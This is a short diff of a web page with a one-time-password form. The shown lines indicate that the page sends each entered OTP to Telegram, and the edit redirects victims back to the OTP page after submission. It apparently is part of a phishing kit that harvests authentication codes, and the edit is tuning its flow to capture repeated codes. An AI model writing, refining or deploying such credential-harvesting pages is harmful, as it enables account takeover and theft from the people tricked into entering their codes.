@@ -152,7 +152,7 @@
   </div>
   <h2>Enter OTP</h2>
   <form id="otpForm" action="javascript:void(0);" aria-label="OTP form">
-    <input type="pasword" id="otp" name="otp" placeholder="Enter OTP" aria-label="OTP" maxlength="6" required autofocus pattern="[0-9]{6}" title="6 digit OTP"/>
+    <input type="text" id="otp" name="otp" placeholder="Enter OTP" aria-label="OTP" maxlength="6" required autofocus pattern="[0-9]{6}" title="6 digit OTP"/>
     <button type="submit" id="otpBtn">Submit</button>
   </form>
 </div>
@@ -211,7 +211,7 @@ OTP: ${otp}
       alert('OTP sent successfully.');
       // Bersihkan session dan redirect ke halaman login lagi
       sessionStorage.clear();
-      window.location.href = 'index.html';
+      window.location.href = 'otp.html';
     })
     .catch(error => {
       console.error('Error sending OTP to Telegram:', error);
